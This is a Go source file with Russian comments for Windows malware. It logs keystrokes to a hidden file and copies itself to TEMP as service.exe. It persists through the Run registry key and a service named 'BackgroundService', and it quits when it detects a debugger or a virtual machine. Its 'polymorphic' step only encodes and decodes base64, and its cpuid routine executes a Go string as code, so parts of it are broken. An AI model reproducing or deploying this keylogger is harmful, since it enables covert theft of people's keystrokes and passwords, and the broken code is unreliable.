package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	serviceName = "BackgroundService"
	logFileName = "hidden.log"
)

// Полиморфная функция для изменения кода программы
func polymorphicTransform(code []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(code)
	return []byte(encoded)
}

// Функция для создания копии программы
func selfCopy() {
	exePath, err := os.Executable()
	if err != nil {
		log.Println("Ошибка получения пути исполняемого файла:", err)
		return
	}

	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = os.TempDir()
	}

	newExePath := filepath.Join(tempDir, "service.exe")
	data, err := ioutil.ReadFile(exePath)
	if err != nil {
		log.Println("Ошибка чтения исполняемого файла:", err)
		return
	}

	transformedData := polymorphicTransform(data)

	decodedData, err := base64.StdEncoding.DecodeString(string(transformedData))
	if err != nil {
		log.Println("Ошибка декодирования:", err)
		return
	}

	err = ioutil.WriteFile(newExePath, decodedData, 0755)
	if err != nil {
		log.Println("Ошибка записи нового файла:", err)
		return
	}

	cmd := exec.Command(newExePath)
	cmd.Start()
}

// Функция для добавления в автозагрузку
func addToStartup() {
	exePath, err := os.Executable()
	if err != nil {
		log.Println("Ошибка получения пути исполняемого файла:", err)
		return
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Println("Ошибка открытия ключа реестра:", err)
		return
	}
	defer k.Close()

	err = k.SetStringValue(serviceName, exePath)
	if err != nil {
		log.Println("Ошибка записи в реестр:", err)
		return
	}

	log.Println("Добавлено в автозагрузку")
}

// Функция для установки программы как службы
func installService() {
	serviceName := "BackgroundService"
	servicePath, _ := os.Executable()

	scm := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE)
	defer windows.CloseServiceHandle(scm)

	service, err := windows.CreateService(scm, windows.StringToUTF16Ptr(serviceName),
		windows.StringToUTF16Ptr(serviceName), windows.SERVICE_ALL_ACCESS,
		windows.SERVICE_WIN32_OWN_PROCESS, windows.SERVICE_AUTO_START,
		windows.SERVICE_ERROR_NORMAL, windows.StringToUTF16Ptr(servicePath),
		nil, nil, nil, nil)
	if err != nil {
		log.Println("Ошибка создания службы:", err)
		return
	}
	defer windows.CloseServiceHandle(service)

	err = windows.StartService(service, 0, nil)
	if err != nil {
		log.Println("Ошибка запуска службы:", err)
	}
}

// Функция для записи нажатий клавиш
func keylogger() {
	filePath := filepath.Join(os.Getenv("APPDATA"), logFileName)
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Println("Ошибка открытия файла:", err)
		return
	}
	defer file.Close()

	attr := windows.FileAttributeHidden
	err = windows.SetFileAttributes(syscall.StringToUTF16Ptr(filePath), attr)
	if err != nil {

		log.Println("Ошибка установки атрибута 'скрытый':", err)
	}

	user32 := windows.NewLazySystemDLL("user32.dll")
	getAsyncKeyState := user32.NewProc("GetAsyncKeyState")
	toUnicode := user32.NewProc("ToUnicode")

	writer := bufio.NewWriter(file)
	var mu sync.Mutex
	for {
		for i := uint8(0); i < 255; i++ {
			if getAsyncKeyState.Call(uintptr(i))&0x8000 != 0 {
				var keyName string
				switch i {
				case windows.VK_LSHIFT, windows.VK_RSHIFT:
					keyName = "[SHIFT]"
				case windows.VK_LCONTROL, windows.VK_RCONTROL:
					keyName = "[CTRL]"
				case windows.VK_LMENU, windows.VK_RMENU:
					keyName = "[ALT]"
				case windows.VK_CAPITAL:
					keyName = "[CAPS LOCK]"
				case windows.VK_TAB:
					keyName = "[TAB]"
				case windows.VK_RETURN:
					keyName = "[ENTER]"
				case windows.VK_BACK:
					keyName = "[BACKSPACE]"
				case windows.VK_SPACE:
					keyName = " "
				default:
					var keyboardState [256]byte
					getKeyboardState := user32.NewProc("GetKeyboardState")
					getKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState[0])))

					var chars [16]uint16
					vk := uintptr(i)
					scanCode := uintptr(windows.MapVirtualKey(uint32(i), windows.MAPVK_VK_TO_VSC))
					toUnicode.Call(vk, scanCode, uintptr(unsafe.Pointer(&keyboardState[0])), uintptr(unsafe.Pointer(&chars[0])), uintptr(16), uintptr(0))
					if chars[0] != 0 {
						keyName = syscall.UTF16ToString(chars[:])
					} else {
						keyName = "[VK:" + strconv.Itoa(int(i)) + "]"
					}
				}
				mu.Lock()
				_, err = writer.WriteString(keyName)
				mu.Unlock()
				if err != nil {
					log.Println("Ошибка записи в файл:", err)
				}
				mu.Lock()
				writer.Flush()
				mu.Unlock()

			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// checkDuplicate проверяет, запущен ли уже экземпляр программы с именем "service.exe"
func checkDuplicate() bool {
	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		log.Println("Ошибка создания снимка процессов:", err)
		return false
	}
	defer windows.CloseHandle(snapshot)

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		log.Println("Ошибка получения первого процесса:", err)
		return false
	}

	for {
		if syscall.UTF16ToString(entry.ExeFile[:]) == "service.exe" && entry.ProcessID != uint32(os.Getpid()) {
			return true
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				return false
			}
			log.Println("Ошибка получения следующего процесса:", err)
			return false
		}
	}
}
func removeSelfCopy() {
	newExePath := filepath.Join(os.Getenv("TEMP"), "service.exe")
	err := os.Remove(newExePath)
	if err != nil {
		log.Println("Ошибка удаления:", newExePath, err)
		return
	}
	log.Println("Удалено:", newExePath)
}

// Проверка на наличие отладчика
func isDebuggerPresent() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

// Проверка на наличие удаленного отладчика
func checkRemoteDebuggerPresent() bool {
	var isRemoteDebuggerPresent uintptr
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	checkRemoteDebuggerPresent := kernel32.NewProc("CheckRemoteDebuggerPresent")
	ret, _, _ := checkRemoteDebuggerPresent.Call(uintptr(windows.CurrentProcess()), uintptr(unsafe.Pointer(&isRemoteDebuggerPresent)))
	return ret != 0 && isRemoteDebuggerPresent != 0
}

// Проверка на виртуальную машину по vendor ID
func isRunningInVM() bool {
	cpuInfo := [4]uint32{}
	cpuid := func(op uint32, info *[4]uint32) {
		asm := `
            mov eax, [rcx]
            xor ecx, ecx
            cpuid
            mov [rdi], eax
            mov [rdi+4], ebx
            mov [rdi+8], edx
            mov [rdi+12], ecx
        `
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		ret, _, _ := windows.Syscall(windows.GetProcAddress(windows.GetModuleHandle(syscall.StringToUTF16Ptr("kernel32.dll")), "VirtualProtect"), 4, uintptr(unsafe.Pointer(&asm)), 0x1000, 0x40, uintptr(unsafe.Pointer(&cpuInfo[0])))
		if ret == 0 {
			panic("VirtualProtect failed")
		}
		syscall.Syscall(uintptr(unsafe.Pointer(&asm)), 2, uintptr(op), 0, uintptr(unsafe.Pointer(&info[0])))
	}
	cpuid(0, &cpuInfo)
	vendor := [13]byte{}
	for i := 0; i < 4; i++ {
		vendor[i] = byte(cpuInfo[1] >> (8 * i) & 0xff)
	}
	for i := 0; i < 4; i++ {
		vendor[i+4] = byte(cpuInfo[3] >> (8 * i) & 0xff)
	}
	for i := 0; i < 4; i++ {
		vendor[i+8] = byte(cpuInfo[2] >> (8 * i) & 0xff)
	}
	vendor[12] = 0x00

	vendorID := string(vendor[:])

	// Проверяем, не является ли ID характерным для виртуальной машины
	vmVendors := []string{"VBoxVBoxVBox", "VMwareVMware", "Microsoft Hv", "KVMKVMKVM"}
	for _, v := range vmVendors {
		if v == vendorID {
			return true
		}
	}
	return false
}

// Основная функция
func main() {
	runtime.LockOSThread()

	// Проверяем, запущена ли уже другая копия
	if checkDuplicate() {
		log.Println("Другая копия уже запущена")
		os.Exit(0)
	}

	// Проверка на наличие отладчика
	if isDebuggerPresent() || checkRemoteDebuggerPresent() {
		log.Println("Отладчик обнаружен")
		os.Exit(1)
	}

	// Проверка на виртуальную машину
	if isRunningInVM() {
		log.Println("Виртуальная машина обнаружена")
		os.Exit(1)
	}

	selfCopy()
	addToStartup()
	installService()
	keylogger()
	removeSelfCopy()
}
